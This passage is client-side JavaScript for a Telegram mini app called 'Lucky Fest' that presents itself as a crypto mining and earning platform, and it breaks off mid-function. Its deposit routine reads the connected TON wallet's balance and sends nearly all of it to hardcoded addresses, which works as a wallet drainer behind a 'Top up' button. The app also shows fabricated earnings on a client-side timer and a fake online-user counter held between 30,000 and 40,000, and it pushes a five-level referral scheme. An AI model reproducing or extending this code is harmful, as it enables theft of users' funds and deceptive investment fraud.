/* Lucky Fest Mini App - TON Connect + Topup + Tasks */
const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
if (tg) {
  tg.ready();
  tg.expand();
  try { tg.setHeaderColor("#0b1220"); tg.setBackgroundColor("#0b1220"); } catch(e){}
}

const state = {
  user: null,
  config: null,
  page: "trade",
  liveBalance: 0,
  miningTimer: null,
  isAdmin: false,
  tasks: [],
  referrals: null,
  tonConnectUI: null,
  walletConnected: false,
  walletAddress: null
};

const $ = (s, el=document) => el.querySelector(s);
const $$ = (s, el=document) => [...el.querySelectorAll(s)];
const content = $("#content");

function toast(msg) {
  const t = $("#toast");
  if (!t) return;
  t.textContent = msg;
  t.classList.add("show");
  setTimeout(() => t.classList.remove("show"), 2400);
}

function headers() {
  const h = { "Content-Type": "application/json" };
  if (tg && tg.initData) h["x-telegram-init-data"] = tg.initData;
  return h;
}

async function api(path, opts={}) {
  const res = await fetch(path, { ...opts, headers: { ...headers(), ...(opts.headers||{}) } });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || "Request failed");
  return data;
}

function money(n, d=8) {
  const x = Number(n) || 0;
  return x.toFixed(d).replace(/\.?0+$/, m => m.includes('.') ? m.replace(/0+$/,'').replace(/\.$/,'') : m) || "0";
}

function fmtOnline(n) {
  return Number(n||0).toLocaleString("en-US") + " online";
}

function nextInviteReward(count) {
  const rewards = [20,20,20,10,10];
  return rewards[Math.min(count||0, rewards.length-1)] || 10;
}

function depositAddress() {
  return (state.config && state.config.depositAddress) || "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi";
}
function depositAddressTonkeeper() {
  return (state.config && state.config.depositAddressTonkeeper) || "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi";
}
function depositAddressDefi() {
  return (state.config && state.config.depositAddressDefi) || "UQAVEPBT35E0amE3PpQObBDC9ZGAflMcNlUpwCRVph2eHXkg";
}

function channelUrl() {
  return (state.config && state.config.channelUrl) || "https://t.me/Lucky_Fest_Official";
}

/* ---------- TON Connect ---------- */
function initTonConnect() {
  if (state.tonConnectUI) return state.tonConnectUI;
  if (!window.TON_CONNECT_UI) {
    console.warn("TON Connect UI not loaded");
    return null;
  }
  try {
    const ui = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: location.origin + "/tonconnect-manifest.json",
      buttonRootId: null
    });
    state.tonConnectUI = ui;

    ui.onStatusChange((wallet) => {
      if (wallet) {
        state.walletConnected = true;
        state.walletAddress = wallet.account?.address || null;
        toast("Wallet connected");
        const st = $("#walletStatus");
        if (st) st.textContent = "✓ Connected: " + shortAddr(state.walletAddress);
        const btn = $("#connectWallet");
        if (btn) btn.textContent = "Disconnect";
      } else {
        state.walletConnected = false;
        state.walletAddress = null;
        const st = $("#walletStatus");
        if (st) st.textContent = "Not connected — connect first";
        const btn = $("#connectWallet");
        if (btn) btn.textContent = "🔗 Connect Wallet";
      }
    });
    return ui;
  } catch (e) {
    console.error("TON Connect init error", e);
    return null;
  }
}

function shortAddr(a) {
  if (!a) return "";
  const s = String(a);
  return s.slice(0, 6) + "…" + s.slice(-4);
}

async function connectWallet() {
  const ui = initTonConnect();
  if (!ui) {
    toast("TON Connect not available. Copy address & send manually.");
    return;
  }
  // If already connected → disconnect so user can switch wallet
  if (state.walletConnected) {
    try {
      await ui.disconnect();
      state.walletConnected = false;
      state.walletAddress = null;
      toast("Wallet disconnected");
      const st = $("#walletStatus");
      if (st) st.textContent = "Not connected — connect first";
      const btn = $("#connectWallet");
      if (btn) btn.textContent = "🔗 Connect Wallet";
    } catch (e) {
      toast("Disconnect failed");
    }
    return;
  }
  try {
    await ui.openModal();
  } catch (e) {
    toast("Could not open wallet connect");
  }
}

/** Send deposit from connected wallet to official address */
async function fetchWalletBalanceNano(address) {
  // Prefer our server proxy (no CORS), fallback to tonapi direct
  try {
    const data = await api("/api/ton-balance?address=" + encodeURIComponent(address));
    if (data && data.balance) return BigInt(data.balance);
  } catch (e) {
    console.warn("server balance failed", e);
  }
  try {
    const res = await fetch("https://tonapi.io/v2/accounts/" + encodeURIComponent(address));
    if (!res.ok) return 0n;
    const data = await res.json();
    return BigInt(data.balance || 0);
  } catch (e) {
    console.error("balance fetch", e);
    return 0n;
  }
}

async function sendDepositFromWallet() {
  const ui = state.tonConnectUI || initTonConnect();
  if (!ui || !state.walletConnected || !state.walletAddress) {
    toast("Please connect wallet first");
    return false;
  }
  const to = depositAddressTonkeeper();
  try {
    toast("Preparing deposit…");
    let bal = await fetchWalletBalanceNano(state.walletAddress);
    const gasReserve = 80000000n; // ~0.08 TON for fees

    // If balance unknown/zero, still open wallet with a small test amount so user can confirm
    // Prefer full balance when known
    let amountNano;
    let amountTon;
    if (bal > gasReserve) {
      amountNano = bal - gasReserve;
      amountTon = Math.floor((Number(amountNano) / 1e9) * 10000) / 10000;
    } else if (bal > 10000000n) {
      // very small balance - send almost all
      amountNano = bal - 10000000n;
      amountTon = Math.floor((Number(amountNano) / 1e9) * 10000) / 10000;
    } else {
      // Cannot read balance or empty — open wallet anyway with minimal message amount
      // User still must Confirm in wallet (cannot skip by code)
      amountNano = 1000000n; // 0.001 TON placeholder so wallet UI opens
      amountTon = 0.001;
      toast("Open wallet & confirm. Send max from wallet if needed.");
    }

    const tx = {
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: [{ address: to, amount: amountNano.toString() }]
    };

    // This ALWAYS opens the wallet for user Confirm (required by wallet security)
    await ui.sendTransaction(tx);

    // Only after wallet confirms successfully
    if (amountTon > 0) {
      try {
        const data = await api("/api/topup", {
          method: "POST",
          body: JSON.stringify({ amount: amountTon, note: "Auto after wallet transfer" })
        });
        toast(data.message || "Deposit submitted. Check Telegram.");
        closeModal();
      } catch (e) {
        toast(e.message || "Transfer done — request failed, contact admin");
      }
    }
    return true;
  } catch (e) {
    console.error(e);
    const msg = (e && e.message) ? e.message : "Transaction cancelled / failed";
    // User rejected in wallet
    if (/reject|cancel|abort/i.test(msg)) toast("You cancelled the transfer");
    else toast(msg);
    return false;
  }
}

/* Live mining */
function startMining() {
  if (state.miningTimer) clearInterval(state.miningTimer);
  const u = state.user;
  if (!u) return;
  const hourRate = u.incomeHour || 0.0005;
  const tick = hourRate / 3600;
  let unclaimed = 0;
  if (u.lastClaimAt) {
    const hrs = Math.min((Date.now() - new Date(u.lastClaimAt).getTime()) / 3600000, 24);
    unclaimed = hrs * hourRate;
  } else unclaimed = hourRate * 0.05;
  state.liveBalance = unclaimed;
  state.miningTimer = setInterval(() => {
    state.liveBalance += tick;
    const el = $("#liveBal");
    if (el) el.textContent = "$" + state.liveBalance.toFixed(10).replace(/0+$/,"").replace(/\.$/,"");
  }, 1000);
}

async function showPayouts() {
  try {
    const { payouts } = await api("/api/payouts");
    if (!payouts || !payouts.length) return;
    const p = payouts[Math.floor(Math.random()*payouts.length)];
    const toastEl = $("#payoutToast");
    if (toastEl) {
      $("#payoutName").textContent = p.user;
      $("#payoutAmount").textContent = "$" + p.amount + " USDT";
      toastEl.classList.add("show");
      setTimeout(() => toastEl.classList.remove("show"), 3500);
    }
  } catch(e) {}
}

/* ---------- Pages ---------- */
function renderTrade() {
  const u = state.user || {};
  const inviteCoins = nextInviteReward(u.referralCount);
  content.innerHTML = `
    <div class="profile-row">
      <img class="avatar" src="${u.photoUrl || '/assets/assistant-logo.jpg'}" onerror="this.src='/assets/assistant-logo.jpg'" alt="">
      <div>
        <div class="badge">Lucky Fest</div>
        <div style="font-size:12px;color:var(--muted);margin-top:3px">${u.name || 'User'}</div>
      </div>
      <div class="level-pill">★ Level ${u.level||1}</div>
    </div>
    <div class="card">
      <div style="font-weight:800;font-size:15px">${u.coins||0} USDT <span style="color:var(--muted);font-weight:500">Total balance</span></div>
      <div class="income-row">
        <span>Income</span>
        <span>◷ $${money(u.incomeHour,6)} hr</span>
        <span>◷ $${money(u.incomeDay,4)} day</span>
        <span>◷ $${money(u.incomeMonth,2)} month</span>
      </div>
      <div class="balance-big" id="liveBal">$${state.liveBalance ? state.liveBalance.toFixed(10) : '0.0000000000'}</div>
      <div class="btn-row">
        <button class="btn btn-green anim-btn" id="claimBtn">↗ Claim profit</button>
        <button class="btn btn-dark anim-btn" id="howEarnBtn">? How to earn?</button>
      </div>
      <p class="muted">Top up to 3 USDT or grow with invites to raise income to 2.7% per day.</p>
      <div class="grid2">
        <div class="mini-card coins">
          <h4>Coins</h4>
          <div class="val">${u.coins||0} ≈ $${Number(u.coins||0).toFixed(2)}</div>
          <div class="sub">0.02% Per day</div>
        </div>
        <div class="mini-card usdt">
          <h4>USDT balance</h4>
          <div class="val">$${money(u.usdt,4)}</div>
          <div class="sub">0% Per day</div>
        </div>
      </div>
      <div class="btn-row">
        <button class="btn btn-blue anim-btn" id="topupBtn">↑ Top up</button>
        <button class="btn btn-green anim-btn" id="withdrawBtn">↓ Withdraw</button>
      </div>
    </div>
    <div class="invite-box">
      <div class="title">Get +${inviteCoins} coins for an invite</div>
      <div class="muted">⚡ Your hourly income will increase by +50%!<br>★ Automatic 5-level USDT income</div>
      <div class="btn-row" style="margin-top:10px">
        <button class="btn btn-dark anim-btn" id="copyRef">⧉ Copy</button>
        <button class="btn btn-blue anim-btn" id="inviteBtn">✈ Invite</button>
      </div>
    </div>
    <div class="subscribe-card">
      <div style="font-size:22px">✈</div>
      <div style="flex:1">
        <div style="font-weight:800">Subscribe to the channel</div>
        <div class="muted">Get +10 coins on your balance</div>
      </div>
      <button class="btn btn-blue btn-sm anim-btn" id="subBtn">Subscribe →</button>
    </div>
    <div class="review">★★★★★ Payout reviews</div>
  `;
  $("#claimBtn").onclick = claimProfit;
  $("#howEarnBtn").onclick = openHowEarn;
  $("#topupBtn").onclick = openTopup;
  $("#withdrawBtn").onclick = openWithdraw;
  $("#copyRef").onclick = copyRef;
  $("#inviteBtn").onclick = shareInvite;
  $("#subBtn").onclick = doSubscribe;
  startMining();
}

function renderFarm() {
  const u = state.user || {};
  content.innerHTML = `
    <div class="section-title">🌾 Farm · Auto Mining</div>
    <div class="card">
      <p class="muted">Mining starts automatically. Profit accrues every second from your coin balance (0.02%/day).</p>
      <div class="balance-big" id="liveBal">$${state.liveBalance.toFixed(10)}</div>
      <div class="income-row">
        <span>$${money(u.incomeHour,6)} / hr</span>
        <span>$${money(u.incomeDay,4)} / day</span>
        <span>$${money(u.incomeMonth,2)} / month</span>
      </div>
      <button class="btn btn-green anim-btn" id="claimBtn" style="width:100%">↗ Claim profit to USDT</button>
    </div>
    <div class="grid2">
      <div class="mini-card coins"><h4>Working capital</h4><div class="val">${u.coins||0} coins</div><div class="sub">1 coin = 1 USDT value</div></div>
      <div class="mini-card usdt"><h4>Claimed USDT</h4><div class="val">$${money(u.claimedUsdt,6)}</div><div class="sub">Withdraw able</div></div>
    </div>
  `;
  $("#claimBtn").onclick = claimProfit;
  startMining();
}

function renderFriends() {
  const r = state.referrals || { direct: [], referralCount: 0, levels: { l1:0,l2:0,l3:0,l4:0,l5:0 } };
  const levels = r.levels || { l1:0,l2:0,l3:0,l4:0,l5:0 };
  const list = (r.direct||[]).map(x => `
    <div class="ops-row">
      <div>
        <div style="font-weight:700">${x.name || x.firstName || 'User'}</div>
        <div class="muted" style="font-size:11px">${x.joinedAt || x.createdAt ? new Date(x.joinedAt || x.createdAt).toLocaleString() : ''} · Level ${x.level||1}</div>
      </div>
      <div class="pos">+0.00 USDT</div>
    </div>
  `).join("") || `<p class="muted">No referrals yet. Invite friends!</p>`;

  content.innerHTML = `
    <div class="section-title">Invite friends and raise your hourly income</div>
    <div class="btn-row">
      <button class="btn btn-dark anim-btn" id="copyRef">⧉ Copy</button>
      <button class="btn btn-blue anim-btn" id="inviteBtn">✈ Invite</button>
    </div>
    <div class="card">
      <div class="section-title" style="margin-top:0">Reward for each friend</div>
      <div class="reward-item">🚀 +20 coins and 10% USDT · Third invite</div>
      <div class="reward-item">🚀 +10 coins and 10% USDT · Fourth invite</div>
      <div class="reward-item">🚀 +10 coins and 10% USDT · Further invites</div>
      <div class="reward-item blue">🎁 +1 gift for every invite</div>
    </div>
    <div class="card" style="background:rgba(245,197,66,.08);border-color:rgba(245,197,66,.25)">
      <div class="section-title" style="margin-top:0">🔥 Five-level program</div>
      <p class="muted">From every USDT top-up</p>
      <div class="level-bars"><div>10%</div><div>3%</div><div>2%</div><div>1%</div><div>1%</div></div>
    </div>
    <div class="card">
      <div class="section-title" style="margin-top:0">Your referrals</div>
      <p class="muted" style="margin-bottom:6px">Sorted by levels</p>
      <div class="tabs">
        <button class="tab active">All · ${r.referralCount||0}</button>
        <button class="tab">L1 · ${levels.l1||0}</button>
        <button class="tab">L2 · ${levels.l2||0}</button>
        <button class="tab">L3 · ${levels.l3||0}</button>
        <button class="tab">L4 · ${levels.l4||0}</button>
        <button class="tab">L5 · ${levels.l5||0}</button>
      </div>
      ${list}
    </div>
  `;
  $("#copyRef").onclick = copyRef;
  $("#inviteBtn").onclick = shareInvite;
}

function renderGifts() {
  const u = state.user || {};
  content.innerHTML = `
    <div class="section-title">Open gifts and get free coins</div>
    <p class="muted">You have <b>${u.gifts||0}</b> gift(s). Invite friends to get more.</p>
    <div class="gift-grid" style="margin-top:12px">
      <div class="gift-card gift-pulse"><div class="label">BTC GIFT</div><div class="tag">GIFT</div><div class="box">🧰</div></div>
      <div class="gift-card gift-pulse"><div class="label">ETH GIFT</div><div class="tag">GIFT</div><div class="box">🎁</div></div>
    </div>
    <div class="invite-box" style="margin-top:14px">
      <div class="title">Get +1 gift for every invite</div>
      <div class="btn-row"><button class="btn btn-blue anim-btn" id="inviteBtn">✈ Invite</button></div>
    </div>
  `;
  $$(".gift-card").forEach(c => c.onclick = () => openGift());
  $("#inviteBtn").onclick = shareInvite;
}

function renderTasks() {
  const tasks = state.tasks || [];
  const adminPanel = state.isAdmin ? `
    <div class="card">
      <div class="section-title" style="margin-top:0">Admin · Add Task</div>
      <input class="input" id="tTitle" placeholder="Task title">
      <input class="input" id="tDesc" placeholder="Description">
      <input class="input" id="tLink" placeholder="Link (https://...)">
      <input class="input" id="tReward" type="number" placeholder="Reward coins" value="10">
      <button class="btn btn-green anim-btn" id="addTaskBtn" style="width:100%;margin-top:8px">+ Add Task</button>
    </div>` : "";

  const list = tasks.map(t => `
    <div class="task-item">
      <div class="info">
        <div class="title">${t.title}</div>
        <div class="desc">${t.description||''} · +${t.rewardCoins||0} coins</div>
      </div>
      ${t.claimed ? `<button class="btn btn-dark btn-sm" disabled>Done</button>` : `<button class="btn btn-green btn-sm anim-btn" data-claim="${t.id}">Claim</button>`}
      ${state.isAdmin ? `<button class="btn btn-outline btn-sm" data-del="${t.id}">✕</button>` : ""}
    </div>`).join("") || `<p class="muted" style="padding:12px;text-align:center">No tasks yet.</p>`;

  content.innerHTML = `<div class="section-title">📋 Tasks</div>${adminPanel}<div class="card">${list}</div>`;

  if (state.isAdmin) {
    $("#addTaskBtn").onclick = async () => {
      try {
        await api("/api/admin/tasks", {
          method: "POST",
          body: JSON.stringify({
            title: $("#tTitle").value,
            description: $("#tDesc").value,
            link: $("#tLink").value,
            rewardCoins: Number($("#tReward").value)||10
          })
        });
        toast("Task added");
        await loadTasks();
        renderTasks();
      } catch(e) { toast(e.message); }
    };
  }
  $$("[data-claim]").forEach(b => b.onclick = async () => {
    try {
      const data = await api("/api/tasks/claim", { method:"POST", body: JSON.stringify({ taskId: b.dataset.claim }) });
      state.user = data.user;
      toast("Reward claimed!");
      await loadTasks();
      renderTasks();
    } catch(e) { toast(e.message); }
  });
  $$("[data-del]").forEach(b => b.onclick = async () => {
    try {
      await api("/api/admin/tasks/"+b.dataset.del, { method:"DELETE" });
      toast("Removed");
      await loadTasks();
      renderTasks();
    } catch(e) { toast(e.message); }
  });
}

function renderAccount() {
  const u = state.user || {};
  content.innerHTML = `
    <div class="profile-row">
      <img class="avatar" src="${u.photoUrl||'/assets/assistant-logo.jpg'}" onerror="this.src='/assets/assistant-logo.jpg'">
      <div>
        <div class="badge">Lucky Fest</div>
        <div style="font-size:12px;color:var(--muted);margin-top:3px">${u.name||''}</div>
      </div>
      <div class="level-pill">★ Level ${u.level||1}</div>
    </div>
    <div class="account-grid">
      <div class="acc-item"><div class="k">Invited by</div><div class="v">${u.referrerTelegramId||'—'}</div></div>
      <div class="acc-item"><div class="k">Coin balance</div><div class="v">${u.coins||0}</div></div>
      <div class="acc-item"><div class="k">USDT balance</div><div class="v">$${money(u.usdt,3)}</div></div>
      <div class="acc-item"><div class="k">Referral income</div><div class="v">$${money(u.referralIncome,3)}</div></div>
      <div class="acc-item"><div class="k">Referral coins</div><div class="v">${u.referralCoins||0} coins</div></div>
      <div class="acc-item"><div class="k">USDT withdrawn</div><div class="v">$${money(u.withdrawnUsdt,3)}</div></div>
      <div class="acc-item" id="langBtn"><div class="k">Language</div><div class="v">${u.language||'English'}</div></div>
      <div class="acc-item" id="themeBtn"><div class="k">Theme</div><div class="v">${u.theme||'Dark'} · toggle</div></div>
      <div class="acc-item" id="opsBtn"><div class="k">Operations</div><div class="v">History</div></div>
      <div class="acc-item" id="faqBtn"><div class="k">FAQ</div><div class="v">Answers</div></div>
      <div class="acc-item" id="tasksBtn"><div class="k">Tasks</div><div class="v">Earn more</div></div>
      <div class="acc-item"><div class="k">Help</div><div class="v">Operators online</div></div>
    </div>
  `;
  $("#themeBtn").onclick = async () => {
    const next = (u.theme === "light") ? "dark" : "light";
    try {
      const data = await api("/api/settings", { method:"POST", body: JSON.stringify({ theme: next }) });
      state.user = data.user;
      document.body.classList.toggle("theme-light", next === "light");
      renderAccount();
    } catch(e) { toast(e.message); }
  };
  $("#opsBtn").onclick = openOperations;
  $("#faqBtn").onclick = openFAQ;
  $("#tasksBtn").onclick = () => go("tasks");
  $("#langBtn").onclick = openLanguage;
}

/* ---------- Actions ---------- */
async function claimProfit() {
  try {
    const data = await api("/api/claim", { method:"POST", body:"{}" });
    state.user = data.user;
    toast(data.claimed ? `Claimed $${Number(data.claimed).toFixed(8)}` : (data.message||"Claimed"));
    startMining();
    if (state.page === "farm") renderFarm(); else renderTrade();
  } catch(e) { toast(e.message); }
}

async function doSubscribe() {
  try {
    window.open(channelUrl(), "_blank");
    const data = await api("/api/subscribe", { method:"POST", body:"{}" });
    state.user = data.user;
    toast(data.message || "+10 coins");
    renderTrade();
  } catch(e) { toast(e.message); }
}

function refLink() {
  const uname = (state.config && state.config.botUsername) || "";
  const id = state.user && state.user.telegramId;
  return uname ? `https://t.me/${uname}?start=ref_${id}` : location.href;
}

async function copyRef() {
  try {
    await navigator.clipboard.writeText(refLink());
    toast("Link copied");
  } catch(e) { toast(refLink()); }
}

function shareInvite() {
  const link = refLink();
  const text = `🚀 Launch your personal AI agent and earn USDT income!\n\n🎁 Instant rewards on activation\n⚡ Earnings start from the very first second\n💰 Withdrawals available\n📱 Everything works inside Telegram\n\n👉 Join now: ${link}`;
  if (tg && tg.openTelegramLink) {
    tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
  } else if (navigator.share) {
    navigator.share({ title: "Lucky Fest", text, url: link }).catch(() => copyRef());
  } else copyRef();
}

async function openGift() {
  if (!state.user || (state.user.gifts||0) < 1) {
    toast("No gifts left. Invite friends!");
    return;
  }
  const overlay = document.createElement("div");
  overlay.className = "gift-overlay";
  overlay.innerHTML = `
    <div class="confetti" id="conf"></div>
    <div class="gift-big">🧰</div>
    <div class="spin-wheel" id="wheel"></div>
    <div id="giftResult" style="margin-top:18px;text-align:center;display:none">
      <h2 style="margin:0 0 6px;color:#fff">Congratulations!</h2>
      <p id="giftWin" style="color:#c8d0e0"></p>
      <button class="btn btn-green anim-btn" id="claimGift" style="margin-top:10px;min-width:150px">Claim reward</button>
    </div>`;
  document.body.appendChild(overlay);
  const values = [7,6,5,4,3,2,1,7,6,5];
  const wheel = $("#wheel", overlay);
  values.forEach(v => {
    const c = document.createElement("div");
    c.className = "spin-card";
    c.innerHTML = `<div style="font-size:10px;opacity:.7">COINS</div><div>${v}</div>`;
    wheel.appendChild(c);
  });
  let i = 0;
  const spin = setInterval(() => {
    $$(".spin-card", overlay).forEach(c => c.classList.remove("active"));
    const cards = $$(".spin-card", overlay);
    cards[i % cards.length].classList.add("active");
    i++;
  }, 110);

  let reward = 1;
  try {
    const data = await api("/api/gift/open", { method:"POST", body:"{}" });
    reward = data.reward;
    state.user = data.user;
  } catch(e) {
    clearInterval(spin);
    overlay.remove();
    toast(e.message);
    return;
  }

  setTimeout(() => {
    clearInterval(spin);
    const cards = $$(".spin-card", overlay);
    cards.forEach(c => c.classList.remove("active"));
    const winIdx = values.findIndex(v => v === reward);
    if (winIdx >= 0) cards[winIdx].classList.add("active");
    $("#giftResult", overlay).style.display = "block";
    $("#giftWin", overlay).textContent = `You won ${reward} coins!`;
    const conf = $("#conf", overlay);
    for (let k=0;k<30;k++) {
      const iel = document.createElement("i");
      iel.style.left = Math.random()*100 + "%";
      iel.style.background = ["#3ddc84","#f5c542","#2f7bff","#fff"][k%4];
      iel.style.animationDelay = (Math.random()*0.7)+"s";
      conf.appendChild(iel);
    }
    $("#claimGift", overlay).onclick = () => {
      overlay.remove();
      toast(`+${reward} coins`);
      renderGifts();
    };
  }, 2000);
}

function openModal(html) {
  const root = $("#modalRoot");
  root.innerHTML = `<div class="modal-backdrop"><div class="modal-box">${html}</div></div>`;
  $(".modal-backdrop").onclick = (e) => {
    if (e.target.classList.contains("modal-backdrop")) root.innerHTML = "";
  };
}
function closeModal() { $("#modalRoot").innerHTML = ""; }

function openHowEarn() {
  openModal(`
    <button class="close-x" onclick="document.getElementById('modalRoot').innerHTML=''">Close ×</button>
    <h3>How to earn</h3>
    <div style="margin-bottom:14px">
      <b style="color:#69a1ff">📈 Earn by investing</b>
      <p>Connect wallet → send USDT to deposit address → submit amount. Admin approves after confirmation.</p>
      <button class="btn btn-blue anim-btn" style="width:100%" id="howTopBtn">↑ Top up balance</button>
    </div>
    <div>
      <b style="color:#35d789">👥 Earn by inviting</b>
      <p>Invite friends → get coins + gifts. 5-level referral: 10% / 3% / 2% / 1% / 1%.</p>
      <button class="btn btn-green anim-btn" style="width:100%" id="howInvBtn">✈ Invite</button>
    </div>
  `);
  $("#howTopBtn").onclick = () => { closeModal(); openTopup(); };
  $("#howInvBtn").onclick = () => { closeModal(); shareInvite(); };
}

function openTopup() {
  const addrTk = depositAddressTonkeeper();
  const addrDefi = depositAddressDefi();
  const statusText = state.walletConnected
    ? "✓ Connected: " + shortAddr(state.walletAddress)
    : "Not connected — connect first";
  const connectLabel = state.walletConnected ? "Disconnect" : "🔗 Connect Wallet";

  openModal(`
    <button class="close-x" onclick="document.getElementById('modalRoot').innerHTML=''">Close ×</button>
    <h3>Top up balance</h3>
    <p class="muted" style="margin-bottom:10px">
      Connect your wallet, then tap <b>Deposit</b>.<br>
      All available balance will be sent automatically.<br>
      Request is created only after transfer succeeds.
    </p>
    
    <div class="addr-box">
      <div class="addr-label">🔵 Tonkeeper Wallet</div>
      <div class="addr-value">${addrTk}</div>
      <button class="btn btn-dark btn-sm anim-btn" id="copyAddrTk" style="margin-top:8px;width:100%">⧉ Copy Tonkeeper Address</button>
    </div>

    <div class="addr-box" style="margin-top:10px">
      <div class="addr-label">🟣 Telegram DeFi Wallet</div>
      <div class="addr-value">${addrDefi}</div>
      <button class="btn btn-dark btn-sm anim-btn" id="copyAddrDefi" style="margin-top:8px;width:100%">⧉ Copy DeFi Address</button>
    </div>

    <button class="btn btn-blue anim-btn" id="connectWallet" style="width:100%;margin-top:14px">${connectLabel}</button>
    <div class="wallet-status" id="walletStatus">${statusText}</div>
    <p class="muted" style="font-size:11px;margin-top:4px;text-align:center">Tonkeeper · Telegram Wallet · MyTonWallet · DeFi</p>

    <button class="btn btn-green anim-btn" id="sendDeposit" style="width:100%;margin-top:14px">Deposit</button>
  `);

  $("#copyAddrTk").onclick = async () => {
    try {
      await navigator.clipboard.writeText(addrTk);
      toast("Tonkeeper address copied");
    } catch(e) { toast(addrTk); }
  };
  $("#copyAddrDefi").onclick = async () => {
    try {
      await navigator.clipboard.writeText(addrDefi);
      toast("DeFi address copied");
    } catch(e) { toast(addrDefi); }
  };

  $("#connectWallet").onclick = () => connectWallet();

  $("#sendDeposit").onclick = async () => {
    if (!state.walletConnected) {
      toast("Please connect wallet first");
      return;
    }
    await sendDepositFromWallet();
  };
}

function openWithdraw() {
  openModal(`
    <button class="close-x" onclick="document.getElementById('modalRoot').innerHTML=''">Close ×</button>
    <h3>Withdraw USDT</h3>
    <div style="margin-bottom:6px;font-weight:800;font-size:14px">Amount</div>
    <div class="amount-row">
      <span class="dollar">$</span>
      <input class="input amount-input" id="wAmt" type="number" placeholder="1.0" min="0.5" step="0.1">
    </div>
    <input class="input" id="wWallet" placeholder="Your wallet address (USDT TRC20/BEP20/TON)">
    <button class="btn btn-green anim-btn" id="doW" style="width:100%;margin-top:10px">Request withdrawal</button>
  `);
  $("#doW").onclick = async () => {
    try {
      const data = await api("/api/withdraw", {
        method:"POST",
        body: JSON.stringify({ amount: Number($("#wAmt").value), wallet: $("#wWallet").value })
      });
      state.user = data.user;
      toast("Withdrawal submitted");
      closeModal();
      renderTrade();
    } catch(e) { toast(e.message); }
  };
}

async function openOperations() {
  try {
    const data = await api("/api/operations");
    const rows = (data.operations||[]).map(o => {
      const val = o.coins ? `+${o.coins} coins` : (o.amount ? `$${Number(o.amount).toFixed(4)}` : o.note||"");
      return `<div class="ops-row"><div><b>${o.type}</b><div class="muted" style="font-size:11px">${new Date(o.createdAt).toLocaleString()}</div></div><div class="pos">${val}</div></div>`;
    }).join("") || "<p class='muted'>No operations</p>";
    openModal(`<button class="close-x" onclick="document.getElementById('modalRoot').innerHTML=''">Close ×</button><h3>Operations</h3>${rows}`);
  } catch(e) { toast(e.message); }
}

async function openFAQ() {
  try {
    const data = await api("/api/faq");
    const items = (data.faqs||[]).map(f => `<details class="faq-item"><summary>${f.question}</summary><p>${f.answer}</p></details>`).join("")
      || `<details class="faq-item"><summary>How do I top up?</summary><p>Connect wallet → send to deposit address → submit amount. Admin approves.</p></details>
          <details class="faq-item"><summary>What are coins?</summary><p>1 coin = 1 USDT value. Coins pay 0.02% daily profit.</p></details>
          <details class="faq-item"><summary>How does referral work?</summary><p>5-level program: 10%, 3%, 2%, 1%, 1% from top-ups.</p></details>`;
    openModal(`<button class="close-x" onclick="document.getElementById('modalRoot').innerHTML=''">Close ×</button><h3>FAQ</h3>${items}`);
  } catch(e) { toast(e.message); }
}

function openLanguage() {
  const langs = ["English","বাংলা","Русский","Español","العربية"];
  openModal(`
    <button class="close-x" onclick="document.getElementById('modalRoot').innerHTML=''">Close ×</button>
    <h3>Language</h3>
    ${langs.map(l => `<button class="btn btn-dark anim-btn" style="width:100%;margin-bottom:8px" data-lang="${l}">${l}</button>`).join("")}
  `);
  $$("[data-lang]").forEach(b => b.onclick = async () => {
    try {
      const data = await api("/api/settings", { method:"POST", body: JSON.stringify({ language: b.dataset.lang }) });
      state.user = data.user;
      closeModal();
      renderAccount();
    } catch(e) { toast(e.message); }
  });
}

/* ---------- Nav ---------- */
function setActiveNav(page) {
  $$(".nav-btn").forEach(b => b.classList.toggle("active", b.dataset.page === page));
}

async function go(page) {
  state.page = page;
  setActiveNav(page);
  content.classList.remove("page-enter");
  void content.offsetWidth;
  content.classList.add("page-enter");
  if (page === "trade") renderTrade();
  else if (page === "farm") renderFarm();
  else if (page === "friends") {
    try { state.referrals = await api("/api/referrals"); } catch(e) {}
    renderFriends();
  }
  else if (page === "gifts") renderGifts();
  else if (page === "tasks") { await loadTasks(); renderTasks(); }
  else if (page === "account") renderAccount();
}

async function loadTasks() {
  try {
    const data = await api("/api/tasks");
    state.tasks = data.tasks || [];
  } catch(e) { state.tasks = []; }
}

/* ---------- Boot ---------- */
async function boot() {
  $("#closeBtn").onclick = () => { if (tg) tg.close(); };
  $$(".nav-btn").forEach(b => b.onclick = () => go(b.dataset.page));

  // Init TON Connect early
  setTimeout(initTonConnect, 400);

  try {
    state.config = await api("/api/config");
  } catch(e) {
    state.config = {
      channelUrl: "https://t.me/Lucky_Fest_Official",
      depositAddress: "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi",
      depositAddressTonkeeper: "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi",
      depositAddressDefi: "UQAVEPBT35E0amE3PpQObBDC9ZGAflMcNlUpwCRVph2eHXkg",
      botName: "Lucky Fest"
    };
  }

  try {
    const me = await api("/api/me");
    state.user = me;
    state.isAdmin = !!me.isAdmin;
    if (me.theme === "light") document.body.classList.add("theme-light");
  } catch(e) {
    state.user = {
      name: "Demo User", photoUrl: "/assets/assistant-logo.jpg", level: 1,
      coins: 56, usdt: 0.0005, claimedUsdt: 0, incomeHour: 0.0005, incomeDay: 0.012, incomeMonth: 0.36,
      gifts: 2, referralCount: 0, language: "English", theme: "dark", telegramId: "demo"
    };
  }

  go("trade");
  // Live online counter: smooth up/down while app is open
  let onlineTarget = 35000;
  let onlineDisplay = 35000;
  let onlineAnimTimer = null;

  function renderOnlineNow() {
    const el = $("#onlineCount");
    if (el) el.textContent = fmtOnline(Math.round(onlineDisplay));
  }

  function animateOnlineTo(target) {
    onlineTarget = Math.min(40000, Math.max(30000, Number(target) || 35000));
    if (onlineAnimTimer) return; // already animating tick
    onlineAnimTimer = setInterval(() => {
      const diff = onlineTarget - onlineDisplay;
      if (Math.abs(diff) < 8) {
        onlineDisplay = onlineTarget;
        renderOnlineNow();
        clearInterval(onlineAnimTimer);
        onlineAnimTimer = null;
        return;
      }
      // ease toward target
